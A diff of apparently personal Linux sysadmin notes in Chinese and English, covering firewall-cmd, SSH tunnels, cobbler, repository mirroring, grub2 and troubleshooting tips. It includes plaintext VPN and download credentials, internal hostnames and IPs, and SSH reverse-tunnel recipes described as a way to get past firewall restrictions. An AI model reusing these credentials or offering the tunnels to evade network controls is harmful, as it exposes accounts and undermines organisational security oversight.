+.....select h.hostid,h.host,h.name,t.httptestid,t.name,t.agent,t.authentication,t.http_user,t.http_password,t.http_proxy,t.retries,t.ssl_cert_file,t.ssl_key_file,t.ssl_key_password,t.verify_peer,t.verify_host,t.delay from httptest t,hosts h where t.hostid=h.hostid and t.nextcheck<=1574237897 and mod(t.httptestid,100)=94 and t.status=0 and h.proxy_hostid is null and h.status=0 and (h.maintenance_status=0 or h.maintenance_type=0)
 
-#unset SSH_ASKPASS
+T 10.67.49.247:42814 -> 10.67.51.118:3306 [AP] #4
+.....select min(t.nextcheck) from httptest t,hosts h where t.hostid=h.hostid and mod(t.httptestid,100)=2 and t.status=0 and h.proxy_hostid is null and h.status=0 and (h.maintenance_status=0 or h.maintenance_type=0)
 
- if [ -x /usr/bin/keychain ] && [ -f $HOME/.ssh/id_dsa ] && [ "$checkagent" -le "1" ]; then
-   /usr/bin/keychain $HOME/.ssh/id_rsa --quiet >/dev/null 2>&1
-   source $HOME/.keychain/${HOSTNAME}-sh
- else
-  if [ -f $HOME/.keychain/${HOSTNAME}-sh ] && [ "$checkagent" -ge "1" ]; then
-   source $HOME/.keychain/${HOSTNAME}-sh
-  fi
- fi
-}
+###########tcpdump用法############
+root@node-1:~# tcpdump -i bond0 -nn -e vlan
 
-# checks to see if theres an ssh-agent running
-check-agent() {
- checkagent=`ps auxww|egrep -v 'grep|defunct|gnome-session'|grep ^${USER}|grep -i ssh-agent|wc -l|awk '{print $1}'`
- if [ "${checkagent}" -eq "0" ]; then
-  echo "there is no ssh-agent running for ${USER}"
-  echo "Now, run ssh-agent for ${USER}..."
-   /usr/bin/keychain ~/.ssh/id_rsa
-#  exit 101
- fi
-}
+############ firewall-cmd ############
+启用masquerade
+[root@kvm-prod ~]# firewall-cmd --zone=public --add-masquerade --permanent
+success
+[root@kvm-prod ~]# firewall-cmd --reload
+success
+You have mail in /var/spool/mail/root
+[root@kvm-prod ~]# firewall-cmd --zone=public --query-masquerade
+yes
+开启端口5930-5933
+[root@KVMSERVER ~]# firewall-cmd --zone=public --add-port=5930-5933/tcp --permanent
+success
+[root@KVMSERVER ~]# firewall-cmd --reload
+success
+
+###########systemd-detect-virt############
+[root@kafka1 ~]# systemd-detect-virt
+none
+root@zabbix-openstack:~# systemd-detect-virt
+kvm
+root@rabbit2:/etc/rabbitmq# systemd-detect-virt
+lxc
+root@lxd-1804:~# systemd-detect-virt
+vmware
+
+########## facter盘点OS #########
+[root@kafka3 ~]# facter hostname virtual productname processor0 memorysize ipaddress lsbdistdescription processorcount operatingsystemrelease
+hostname => kafka3
+ipaddress => 10.67.51.146
+lsbdistdescription => nil
+memorysize => 62.73 GB
+operatingsystemrelease => 7.5.1804
+processor0 => Intel(R) Xeon(R) CPU E5-2650 v2 @ 2.60GHz
+processorcount => 32
+productname => R2-1206R-PA
+virtual => physical
+
+[root@es1 ~]# facter hostname virtual productname processor0 memorysize ipaddress lsbdistdescription processorcount operatingsystemrelease
+hostname => es1
+ipaddress => 10.67.36.53
+lsbdistdescription => CentOS Linux release 7.5.1804 (Core)
+memorysize => 15.51 GB
+operatingsystemrelease => 7.5.1804
+processor0 => Intel(R) Xeon(R) CPU E5-2620 0 @ 2.00GHz
+processorcount => 4
+productname => VMware Virtual Platform
+virtual => vmware
+
+=========================================================== 异常 & 排错 ===========================================================
+
+###########docker error####################
+$ sudo docker run -i -t centos /bin/bash  
+unable to remount sys readonly: unable to mount sys as readonly max retries reached
+Need to vi /etc/sysconfig/docker
+other_args="--exec-driver=lxc --selinux-enabled"
+/etc/init.d/docker restart
+
+###################when there's much difference between df and du############
+lsof | grep "(deleted)"            then restart app
+
+#######################################
+If you upgrade from RHEL 5 to an unsupported kernel, you might not be able to access data on the virtual machine's PVSCSI disks. 
+You can run vmware-config-tools.pl with the kernel-version parameter to regain access. 
+
+##############test socks ruleset############################
+connect -d -S 129.39.109.217 10.225.0.175 22
+code:
+ 	     o  X'00' succeeded
+             o  X'01' general SOCKS server failure
+             o  X'02' connection not allowed by ruleset
+             o  X'03' Network unreachable
+             o  X'04' Host unreachable
+             o  X'05' Connection refused
+             o  X'06' TTL expired
+             o  X'07' Command not supported
+             o  X'08' Address type not supported
+
+######kvm虚拟机使用四五个月以后，实体机swap占用高#####
+[root@kvm-prod images]# free -g
+              total        used        free      shared  buff/cache   available
+Mem:             62          31           0           2          30          27
+Swap:            31          28           3
+
+[root@kvm-prod images]# smem -rs swap |grep qemu
+ 8995 qemu     /usr/libexec/qemu-kvm -name  7888380  3650768  3650922  3655344
+ 8916 qemu     /usr/libexec/qemu-kvm -name  7848556  3574368  3574522  3578952
+ 8846 qemu     /usr/libexec/qemu-kvm -name  7435844  4074700  4075031  4080052
+24549 qemu     /usr/libexec/qemu-kvm -name  2004912  1487172  1487992  1493668
+ 1270 qemu     /usr/libexec/qemu-kvm -name  1148468  2982392  2982546  2986932
+ 8683 qemu     /usr/libexec/qemu-kvm -name   442012  5832732  5833257  5838404
+20225 qemu     /usr/libexec/qemu-kvm -name   347148  3965604  3966034  3971200
+清理swap。关闭VM后再开启
+[root@kvm-prod images]# free -g
+              total        used        free      shared  buff/cache   available
+Mem:             62          25           6           2          31          33
+Swap:            31           6          25
+
+[root@kvm-prod images]# smem -rs swap |grep qemu
+24549 qemu     /usr/libexec/qemu-kvm -name  2052244  1437352  1438494  1446368
+ 1270 qemu     /usr/libexec/qemu-kvm -name  1151156  2979704  2979859  2984244
+ 8683 qemu     /usr/libexec/qemu-kvm -name   443588  5831156  5831504  5836828
+20225 qemu     /usr/libexec/qemu-kvm -name   347268  3965484  3965833  3971080
+25944 root     grep --color=auto qemu             0      224      229      992
+25452 qemu     /usr/libexec/qemu-kvm -name        0  2200692  2202220  2210760
+24357 qemu     /usr/libexec/qemu-kvm -name        0  2613064  2614592  2623132
+23343 qemu     /usr/libexec/qemu-kvm -name        0  3080640  3082168  3090708
+
+############systemd 解决kafka connect启动太快而失败######
+Kafka Connect might start too fast and fail because Kafka service is not ready yet. By adding directive ExecStartPre = /usr/bin/sleep 10 to Kafka Connect service, 
+we can delay its start for 10 seconds. Or, which I like more, we would actually handle the failure and restart Kafka Connect.
+Restart = on-failure
+RestartSec = 10
+
+######################init=/bin/bash############################
+When the computer starts, it runs a program called "init", usually found at /bin/init or /sbin/init. This program is responsible for all the system startup and creating a usable environment.
+
+Specifying init=/bin/bash tells the kernel to run /bin/bash instead (which is a shell). Specifying rw tells the kernel to boot with the hard disk in read-write mode instead of read-only mode. 
+Traditionally the kernel starts with the disk in read-only mode and a process later on checks the integrity of the disk before switching to read-write.
 
 #################RHEL 7#####################
 Rescue mode provides a convenient single-user environment and allows you to repair your system in situations 
@@ -998,40 +733,160 @@ memroy in /proc is none, can't issue "mount, free -m,lvm lvs,df"
 runlevel switch
 systemctl rescue
 systemctl default
+
+##########定时任务 getpwnam() failed###########
+cron没有写root所致
+*/1 * * * * root /etc/zabbix/zabbix_agentd.d/pageinout.sh
+
+######### 作为 reposync centos8更新不到新包时的workaround ########
+on repo8 container:
+dnf module install idm:DL1/{server,client,dns,adtrust} --downloadonly
+mv -f /var/cache/dnf/AppStream-bf1daca1ea021975/packages/*.rpm /usr/share/nginx/html/centos8-x86_64/AppStream/Packages
+dnf clean packages
+
+########### e1000 driver not supported in RHEL 8######
+11.1.3.3. The e1000 network driver is not supported in RHEL 8
+In Red Hat Enterprise Linux 8, the e1000 network driver is not supported. This affects both bare metal and virtual environments. However, 
+the newer e1000e network driver continues to be fully supported in RHEL 8.
+
+
+=========================================================== 安装配置 ===========================================================
+
+######### ubuntu16.04支持nbd #########
+modprobe nbd max_part=16
+
+#####################################build yum repo###################
+How to use yum:	
+	1.    Download the patches in knapweedsgfl02 server first 
+	2.     Script located in knapweedsgfl02 server - > /export/install/yum 
+	3.    Script:
+[root@knapweedsgfl02 yum]# cat reposync64bit.sh 
+
+/usr/bin/reposync --arch=x86_64 --repoid=rhel-x86_64-server-5 -p /export/install/yum/rhel5_64bit/  -n -l | tee yum_reposync_64bit.log
+
+[root@knapweedsgfl02 yum]# 
+
+	4.    Run this script to download the patches 
+	5.    Then run the command:   
+                   createrepo -u /export/install/yum/rhel5_64bit/rhel-x86_64-server-5/getPackage
+	6.    This will update the repodata 
+	7.    Once this is done, then go to compute nodes to run the -> yum update
+
+################time zone################
+[root@cfibml08 Asia]# ls -l /etc/localtime
+lrwxrwxrwx 1 root root 36 Oct  2  2009 /etc/localtime -> /usr/share/zoneinfo/Australia/Sydney
+
+ln -sf /usr/share/zoneinfo/Asia/Singapore /etc/localtime
+
+#####################################################
+ssh tunnel + squid               反向tunnel +squid代理突破防火墙限制使用yum
+ssh -R 1880:9.190.26.244:80 racv-l402             转发yum repo地址
+ssh -R 1880:10.62.32.27:33128 10.134.236.86       转发proxy
+本机：
+1   install squid
+2   #ssh -Nf -R 7001:localhost:3128 master  本地运行
+lab机器：
+[root@learn yum.repos.d]# grep proxy ../yum.conf
+proxy=http://127.0.0.1:7001
+
+################mysql#############
+ssh -Nf -L 3306:localhost:3306 chensen@cfibml08       正向tunnel 本地运行
+mysql -h 127.0.0.1 -P 7001 -u chensen
+
+ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
+ssh -CNfL 8443:10.20.0.2:8443 root@10.67.50.156
+##############firefox###########
+ssh -D 7071 chensen@cfibml10
+
+######### bond ################
+cat/proc/net/bonding/bond0 
+cd /sys/class/net/bond0
+
+#############change timezone to Asia Shanghai#############
+sudo sed -i 's:Etc/UTC:Asia/Shanghai:' /etc/sysconfig/clock
+sudo rm -f /etc/localtime
+sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
+
+#########POODLE ldaps fix############
+TLSProtocolMin 768   # (3 << 8) disables SSLv2
+TLSProtocolMin 769   # ((3 << 8)+1) disables SSLv2 and SSLv3
+
+OpenLDAPのサーバ(slapd)でSSL 3.0を禁止にする方法。
+slapd.confのグローバルセクションに以下の1行を记载する。
+# SSL 3.0 (プロトコルのバージョン3.0 → 0x0300 → 10进数で768)
+# TLS 1.0 (プロトコルのバージョン3.1 → 0x0301 → 10进数で769)
+# TLS 1.1 (プロトコルのバージョン3.2 → 0x0302 → 10进数で770)
+# TLS 1.2 (プロトコルのバージョン3.3 → 0x0303 → 10进数で771)
+# OpenLDAP 2.4.36未満では「TLSProtocolMin 769」と指定する。
+# OpenLDAP 2.4.36以降では「TLSProtocolMin 3.1」と指定する。
+TLSProtocolMin 3.1
+
+##########option D#############
+/etc/pam.d/password-auth:auth        required      /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
+/etc/pam.d/system-auth:auth	    required	  /lib64/security/pam_listfile.so item=user sense=deny file=/etc/security/userlist onerr=succeed
+
+#######sudo * ############
+/bin/chown -R pcm\:pcm /pcm/[!".."]*,\
+	/bin/chown pcmdev\:pcmdev /pcm/[!".."]*,\
+	/bin/chown -R pcmdev\:pcmdev /pcm/[!".."]*,\
+	/bin/cat /pcm/[!".."]*,\
+	/bin/ln -s /pcm/[!".."]* *,\
+	/bin/mkdir /pcm/[!".."]*,\
+	/bin/mv /pcm/[!".."]* /pcm/[!".."]*,\
+	/bin/rm /pcm/[!".."]*,\
+	/bin/rmdir /pcm/[!".."]*,\
+	/usr/bin/tail /pcm/[!".."]*,\
+	/usr/bin/tail -f /pcm/[!".."]*
+
+############sudo ##########
+
+R5,R6,SUSE11        #include
+0750 /etc/sudoers.d
+0440 /etc/sudoers.d/sample
+
+##################pssh with tunnel#################
+pssh -h djs_uat -x '-t -t -R 1880:b23leilapp01:80' --inline-stdout "sudo /usr/bin/yum list httpd"
+
+##################cssh with tunnel#################
+add below in .csshrc
+ssh_args=-R 1880:mrepos:80
+
+##################koan######################
+[root@localhost ~]# koan --list=profiles --server=192.168.124.200
+- looking for Cobbler at http://192.168.124.200:80/cobbler_api
+centos-6.5-x86_64
+centos-6.5-x86_64-basic
+[root@localhost ~]# koan --replace-self --server=192.168.124.200 --profile=centos-6.5-x86_64-basic
+- looking for Cobbler at http://192.168.124.200:80/cobbler_api
+- reading URL: http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic
+install_tree: http://192.168.124.200/cblr/links/centos-6.5-x86_64
+downloading initrd initrd.img to /boot/initrd.img_koan
+url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
+- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/initrd.img
+downloading kernel vmlinuz to /boot/vmlinuz_koan
+url=http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
+- reading URL: http://192.168.124.200/cobbler/images/centos-6.5-x86_64/vmlinuz
+- ['/sbin/grubby', '--add-kernel', '/boot/vmlinuz_koan', '--initrd', '/boot/initrd.img_koan', '--args', '"ks=http://192.168.124.200/cblr/svc/op/ks/profile/centos-6.5-x86_64-basic ksdevice=link kssendmac lang= text "', '--copy-default', '--make-default', '--title=kick1457640229']
+- ['/sbin/grubby', '--update-kernel', '/boot/vmlinuz_koan', '--remove-args=root']
+- reboot to apply changes
+[root@localhost ~]# reboot
+
+###################cobbler定制安装系统############
+# cobbler system add --name=test1 --mac=52:54:00:72:66:1a --interface=eth1 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test1.example.com --netboot-enabled=true --name-servers="192.168.124.1"
+# cobbler system edit --name=test1 --interface=eth1 --ip-address=192.168.124.209
+# cobbler system report --name=test1
+  
+# cobbler system add --name=test2 --mac=52:54:00:99:ac:59 --interface=eth0 --static=1 --profile=centos-6.5-x86_64-basic --hostname=test2.example.com --netboot-enabled=true --name-servers="192.168.124.1"
+# cobbler system --name=test2 --interface=eth0 --ip-address=192.168.124.208
+# cobbler system edit --name=test2 --interface=eth0 --ip-address=192.168.124.208
+# cobbler system report --name=test2
+
+#####################array_vpn client############3
+/usr/local/array_vpn/array_vpnc64 -hostname vpn.hkg02.softlayer.com --username djsen -passwd Aq1sw@de3 -port 443
+
 ############python simple HTTP server##########
 python -m SimpleHTTPServer 80
-###########cgroup##############
-echo 40000 > /cgroup/cpu/libvirt/qemu/cpu.cfs_quota_us   
-cgset -r cpu.cfs_quota_us=40000 libvirt/qemu/
-cgget -g cpu libvirt/qemu/
-lscgroup
-############################IO tuning############
-avgrq-sz = ( rsec/s + wsec/s ) / (  r/s + w/s )
-  262.76 = (69175.98+ 3081.04) / (250.49+24.50) within the highlighted sample line 
 
-The svctm field is simply calculated from ( %util * 1000ms / #completed io per second ). 
-For example, ( 20.6% * 1000ms / 274.99 ) = 0.729ms per io
-svctm   = ( %util * 1000ms ) / (   r/s + w/s ) device "busy" time / # of completed io
-0.729ms = ( 20.6% * 1000ms ) / ( 250.49+24.50) which the highlighted sample line
-
-cat /sys/block/<sdX>/device/queue_depth
-#lsscsi -l
-
-The value of nr_requests determines the amount of I/O requests that get buffered before the I/O scheduler sends / receives data to the block device, if you are using a RAID card / Block Device that can handle a larger queue than what the I/O scheduler is set to, raising the value of nr_requests may help to improve throughout and reduce server load when large amounts of I/O occur on the server. If you are using Deadline or CFQ as the scheduler, it is suggested that you should set the nr_request value to 2 times the value of queue depth.
-
-echo 256 > /sys/block/sda/queue/nr_requests
-
-[root@oc1181188062 queue]# cat /sys/block/sda/queue/nr_requests 
-128
-[root@oc1181188062 queue]# cat /sys/block/sda/device/queue_depth 
-31
-#sg_map -x
-cfibml05:/proc/scsi/sg # cat /proc/scsi/sg/devices 
-0	2	0	0	0	1	256	0	1
-H       C       I       L       type           QD
-What is queue depth?
-The number of simultaneous requests on a drive's request queue
-queue depth of the disk controller
 ############set up ulimit for service############
 Add the desired ulimit command(s) to /etc/sysconfig/<SERVICENAME>, for example:
 Raw
@@ -1064,6 +919,169 @@ Max msgqueue size         819200               819200               bytes
 Max nice priority         0                    0                    
 Max realtime priority     0                    0                    
 Max realtime timeout      unlimited            unlimited            us        
+
+##############unpack and repack initrd#########
+    Create a directory and switch into it:
+# mkdir test
+# cd test
+
+    Then uncompress and extract the initrd:
+# zcat /boot/initrd-2.6.18-164.6.1.el5.img | cpio -idmv
+
+    Edit the contents (if needed)
+    Finally repack and compress the initrd image:
+# find . | cpio -o -c | gzip -9 > /boot/test.img
+
+###############jenkins#############
+
+yum install java-1.7.0-openjdk
+curl -o jenkins.repo http://pkg.jenkins-ci.org/redhat-stable/jenkins.repo
+rpm --import https://jenkins-ci.org/redhat/jenkins-ci.org.key
+yum install -y jenkins
+
+########SSL
+java InstallCert 10.67.44.66
+cp jssecacerts /etc/alternatives/jre/lib/security/
+keytool -list -alias 10.67.44.66-1
+openssl s_client -connect 10.67.44.66:443 < /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > public.crt
+keytool -import -alias 10.67.44.66-1 -keystore /etc/alternatives/jre/lib/security/cacerts -file public.crt
+java SSLPoke 10.67.44.66 443
+
+######rhel5.8 using virtio ##########
+mkinitrd --with virtio_pci --with virtio_blk --with virtio -f /boot/initrd-$(uname-r).img $(uname -r)
+
+###########linux network###########
+Linux 上配置网络设备命令举例
+以 Redhat6.2 红帽Linux 发行版为例，如果已安装 VLAN 内核模块和管理工具 vconfig，TAP/TUN 设备管理工具 tunctl，那麽可以用以下命令设置前述网络设备：
+Bridge 操作
+* 创建 Bridge：brctl addbr [BRIDGE NAME]
+* 删除 Bridge：brctl delbr [BRIDGE NAME]
+* attach 设备到 Bridge：brctl addif [BRIDGE NAME] [DEVICE NAME]
+* 从 Bridge detach 设备：brctl delif [BRIDGE NAME] [DEVICE NAME]
+* 查询 Bridge 情况：brctl show
+
+VLAN 设定
+* 创建 VLAN 设备：vconfig add [PARENT DEVICE NAME] [VLAN ID]
+* 删除 VLAN 设备：vconfig rem [VLAN DEVICE NAME]
+* 设置 VLAN 设备 flag：vconfig set_flag [VLAN DEVICE NAME] [FLAG] [VALUE]
+* 设置VLAN 设备qos：
+-- vconfig set_egress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
+-- vconfig set_ingress_map [VLAN DEVICE NAME] [SKB_PRIORITY] [VLAN_QOS]
+* 查询VLAN 设备情况：cat /proc/net/vlan/[VLAN DEVICE NAME]
+
+VETH & TAP 设定
+* 创建 VETH 设备：ip link add link [DEVICE NAME] type veth
+* 创建 TAP 设备：tunctl -p [TAP DEVICE NAME]
+* 删除 TAP 设备：tunctl -d [TAP DEVICE NAME]
+* 查询系统里所有二层设备，包括 VETH/TAP 设备：ip link show
+
+其他相关设定
+* 删除普通二层设备：ip link delete [DEVICE NAME] type [TYPE]
+
+####################Ubuntu 16.04 手动升级内核##############
+要升级 Ubuntu 16.04 的内核，打开 http://kernel.ubuntu.com/~kernel-ppa/mainline/ 并选择列表中需要的版本（发布此文时最新内核是 4.10.1）。
+接下来，根据你的系统架构下载 .deb 文件：
+对于 64 位系统：
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-image-4.4.0-75-generic_4.4.0-75.96~14.04.1_amd64.deb
+wget http://10.67.51.158/ubuntu/pool/main/l/linux-lts-xenial/linux-headers-4.4.0-75_4.4.0-75.96~14.04.1_all.deb
+linux-headers-4.15.0-29 linux-headers-4.15.0-29-generic linux-image-4.15.0-29-generic linux-modules-4.15.0-29-generic linux-modules-extra-4.15.0-29-generic
+这是 32 位系统：
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001_4.10.1-041001.201702260735_all.deb
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-headers-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
+$ wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.1/linux-image-4.10.1-041001-generic_4.10.1-041001.201702260735_i386.deb
+下载完成这些所有内核文件后，如下安装：
+$ sudo dpkg -i *.deb
+安装完成后，重启并验证新的内核已经被使用了：
+$ uname -sr
+就是这样。你下载就可以使用比 Ubuntu 16.04 默认安装的内核的更新版本了。
+###############apt-get 升级指定包############
+root@zabbix-openstack:~# apt-get update
+root@zabbix-openstack:~# apt-cache policy openssh-client
+openssh-client:
+  Installed: 1:7.2p2-4ubuntu2.2
+  Candidate: 1:7.2p2-4ubuntu2.8
+  Version table:
+     1:7.2p2-4ubuntu2.8 500
+        500 http://10.67.51.164/ubuntu xenial-updates/main amd64 Packages
+        500 http://10.67.51.164/ubuntu xenial-security/main amd64 Packages
+ *** 1:7.2p2-4ubuntu2.2 100
+        100 /var/lib/dpkg/status
+     1:7.2p2-4 500
+        500 http://10.67.51.164/ubuntu xenial/main amd64 Packages
+
+apt-get --only-upgrade install Package
+
+###################apt-get升级内核###################
+使用apt-get
+apt-get upgrade
+apt-get dist-upgrade           升级kernel
+
+先改变sources.list，然後apt-get upgrade & apt-get dist-upgrade  可升级release
+
+sudo apt-get install update-manager-core 
+sudo do-release-upgrade
+LTS systems are only automatically considered for an upgrade to the next LTS via do-release-upgrade with the first point release. 
+So for example 14.04 will only upgrade once 16.04.1 is released.
+
+Traditionally, Debian releases have been upgradeable by changing Apt's /etc/apt/sources.list, 
+which specifies package repositories, and using apt-get dist-upgrade to perform the upgrade itself. 
+Ubuntu is still a Debian-derived distribution, so this process would likely still work. 
+Instead, however, we'll use do-release-upgrade, a tool provided by the Ubuntu project, 
+which handles checking for a new release, updating sources.list, and a range of other tasks. 
+This is the officially recommended upgrade path for server upgrades which must be performed over a remote connection.
+
+Before doing a release upgrade, create a snapshot of your Droplet. 
+Upgrading releases can lead to some rather unexpected results if your application 
+isn't compatible with new software versions that will be installed when you upgrade.
+
+For example, I'll use PHP. Older Ubuntu versions have PHP 5.x in their repositories 
+while the newer releases have PHP 7.0.x. When performing a release upgrade, PHP 5.x becomes 7.0.x, 
+so any PHP applications on the server that are not fully compatible with PHP 7.0 break instantly.
+
+The same is true for many languages.
+##############apt-mirror behind proxy ######
+apt-get install apt-mirror
+Configure wget (which is used by apt-mirror) to go through 
+the http proxy by editing /etc/wgetrc and enabling the following options
+ (skip this one if you aren’t using a http proxy to connect to the internet)
+http_proxy
+use_proxy
+su - apt-mirror -c apt-mirror
+
+ ########rbd map disk without LVM################
+ If you have multipath installed on your system, make sure it is stopped before mounting the volume.
+ There is a bug which prevents the unmapping of RBD volumes.
+ # service multipath-tools stop
+ rbd map compute/309e1cca-69b4-468a-8455-91c2c80a0127_disk
+  fdisk -l /dev/rbd1
+  rbd showmapped
+  rbd unmap /dev/rbd1
+  
+###########rbd map disk with LVM ###########
+ rbd map volumes/volume-e491793b-c42a-49dd-8861-af7541225815
+ kpartx -av /dev/rbd0
+ pvscan
+ mount /dev/mapper/ubuntu--vg-root /mnt
+ ...fix files in the filesystem..
+ umount /mnt
+ vi /etc/lvm/lvm.conf
+ pvscan
+ dmsetup ls
+ dmsetup remove ubuntu--vg-swap_1 ubuntu--vg-root
+ dmsetup ls
+ dmsetup remove rbd0p5
+ rbd unmap /dev/rbd0
+
+##########bonding#############
+rr mode0   balance-xor mode2   mode3   static link aggr
+802.3ad  mode4    LACP
+mode5  mode6      no need to config switch
+
+#保存iptables规则
+[root@fuel ~]# /usr/libexec/iptables/iptables.init save
+iptables: Saving firewall rules to /etc/sysconfig/iptables:[  OK  ]
+
 ################/etc/resolv.conf###########
     The /etc/resolv.conf file will be overwritten if any network interfaces use DHCP for activation.
     To prevent this, ensure such interfaces have PEERDNS=no set in their ifcfg file, for example:
@@ -1094,154 +1112,401 @@ Max realtime timeout      unlimited            unlimited            us
     nameserver 10.0.0.254
 
     To prevent the use of the nameserver returned by DHCP, add PEERDNS=no to the ifcfg-file
-##############unpack and repack initrd#########
-    Create a directory and switch into it:
-# mkdir test
-# cd test
 
-    Then uncompress and extract the initrd:
-# zcat /boot/initrd-2.6.18-164.6.1.el5.img | cpio -idmv
+#####################################yum repo and wget rhel5.10 iso######################
+wget -c -t 100 --user=jintaoxu@cn.ibm.com --password=12345678 --no-check-certificate -O rhel-server-5.10-x86_64-dvd.iso "https://access.cdn.redhat.com//content/origin/files/sha256/46/46d49d8565025cb2623c391a82668d760d0549be3727062424956bec8af8cca2/rhel-server-5.10-x86_64-dvd.iso?_auth_=1407732078_9e240dfb42fbd4df6661eafd1c43f1ce"
+-----------------------------------
+/etc/yum.conf
+[main]
+proxy=http://127.0.0.1:7001
+exclude=kernel*
+-----------------------------------
+ssh -Nf -R 7001:localhost:80 g28lcxwas01
+yum update --downloadonly --downloaddir=/home/chensen/mrepo
+--------------------------------------------
 
-    Edit the contents (if needed)
-    Finally repack and compress the initrd image:
-# find . | cpio -o -c | gzip -9 > /boot/test.img
+################dante################
+[root@proxy ~]# cat /etc/sockd.conf
+internal: ens9   port = 1080
+external: eth1
 
-#####################array_vpn client############3
-/usr/local/array_vpn/array_vpnc64 -hostname vpn.hkg02.softlayer.com --username djsen -passwd Aq1sw@de3 -port 443
+user.privileged:   root
+user.unprivileged: nobody
+socksmethod:       none
+errorlog: /var/log/sockd.errlog
+logoutput: /var/log/sockd.log
 
-##############test socks ruleset############################
-connect -d -S 129.39.109.217 10.225.0.175 22
-code:
- 	     o  X'00' succeeded
-             o  X'01' general SOCKS server failure
-             o  X'02' connection not allowed by ruleset
-             o  X'03' Network unreachable
-             o  X'04' Host unreachable
-             o  X'05' Connection refused
-             o  X'06' TTL expired
-             o  X'07' Command not supported
-             o  X'08' Address type not supported
-			 
+# LAN
+client pass {
+    from: 10.67.50.0/23 to: 0.0.0.0/0
+    log: error connect # disconnect
+}
+
+# allow connect from anywhere as long as client was authed previously
+socks pass {
+    from: 0.0.0.0/0 to: 0.0.0.0/0
+    command: connect
+    log: error connect # disconnect
+}
+[root@cobbler ansible]# cat ~/.ssh/config
+#Host 10.20.0.8
+#  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
+Host 10.20.0.*
+  ProxyCommand connect-proxy -S 10.67.51.159 %h %p
+
+
+###################mrepo##############
+[root@yumserver6 mrepo.conf.d]# grep createrepo-options /usr/bin/mrepo
+        self.createrepooptions = self.getoption('main', 'createrepo-options', '-p -s sha1')    ###centos5用sha1的加密算法
+
+
+[CentOS5]
+name = CentOS $release ($arch)
+release = 5
+arch = x86_64
+metadata = yum repomd
+
+#iso=CentOS-5.11-x86_64-bin-DVD1.iso
+os=http://mirrors.aliyun.com/centos/$release/os/$arch/CentOS/
+updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/RPMS/
+extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/RPMS/
+epel=http://mirrors.aliyun.com/epel/5/$arch/
+
+
+[CentOS6]
+name = CentOS $release ($arch)
+release = 6
+arch = x86_64
+metadata = yum repomd
+
+#iso=CentOS-6.5-x86_64-bin-DVD1.iso
+os=http://mirrors.aliyun.com/centos/$release/os/$arch/Packages/
+updates=http://mirrors.aliyun.com/centos/$release/updates/$arch/Packages/
+extras=http://mirrors.aliyun.com/centos/$release/extras/$arch/Packages/
+epel=http://mirrors.aliyun.com/epel/6/$arch/
+
+cat /etc/mrepo.conf
+### Configuration file for mrepo
+
+### The [main] section allows to override mrepo's default settings
+### The mrepo-example.conf gives an overview of all the possible settings
+[main]
+srcdir = /var/mrepo
+wwwdir = /var/www/mrepo
+confdir = /etc/mrepo.conf.d
+arch = x86_64
+http_proxy=http://10.67.61.205:808
+https_proxy=http://10.67.61.205:808
+ftp_proxy=http://10.67.61.205:808
+
+mailto = root@localhost
+smtp-server = localhost
+
+###########grub2#########
+/etc/default/grub  custom settings
+/etc/grub.d/     template files
+
+#grub2的配置文件 
+/boot/grub2/grub.cfg file on traditional BIOS-based machines
+/boot/efi/EFI/fedora/grub.cfg file on UEFI machines
+
+#menuentry
+linux  64-bit IBM POWER Series
+linux16 x86_64 BIOS-based systems
+linuxefi  UEFI-based systems
+
+#grubby命令
+[root@cobbler grub2]# grubby --default-kernel
+/boot/vmlinuz-3.10.0-514.21.2.el7.x86_64
+
+[root@cobbler grub2]# grubby --info=ALL
+index=0
+kernel=/boot/vmlinuz-3.10.0-514.21.2.el7.x86_64
+args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet LANG=en_US.UTF-8"
+root=/dev/mapper/sysvg-root
+initrd=/boot/initramfs-3.10.0-514.21.2.el7.x86_64.img
+title=CentOS Linux (3.10.0-514.21.2.el7.x86_64) 7 (Core)
+index=1
+kernel=/boot/vmlinuz-3.10.0-327.el7.x86_64
+args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet LANG=en_US.UTF-8"
+root=/dev/mapper/sysvg-root
+initrd=/boot/initramfs-3.10.0-327.el7.x86_64.img
+title=CentOS Linux (3.10.0-327.el7.x86_64) 7 (Core)
+index=2
+kernel=/boot/vmlinuz-0-rescue-2170484fa7764747863cc1df9de5ebbb
+args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet"
+root=/dev/mapper/sysvg-root
+initrd=/boot/initramfs-0-rescue-2170484fa7764747863cc1df9de5ebbb.img
+title=CentOS Linux (0-rescue-2170484fa7764747863cc1df9de5ebbb) 7 (Core)
+index=3
+non linux entry
+
+~]# grubby --remove-args="rhgb quiet" --args=console=ttyS0,115200 --update-kernel /boot/vmlinuz-4.2.0-1.fc23.x86_64
+
+##############ulimit#######
+There are two ways of changing the ulimit setting on a machine.
+
+1 ulimit -n <some_value>. This will change the ulimit settings only for the current shell session. As soon as you open another shell session, you are back to square one i.e. 1024 file 
+descriptors. So this is probably not what you want.
+
+2 fs.file-max = 500000. Add this line to the end of the file /etc/sysctl.conf. And add the following
+* soft nofile 500000
+* hard nofile 500000
+root soft nofile 500000
+root hard nofile 500000
+to the file /etc/security/limits.conf.
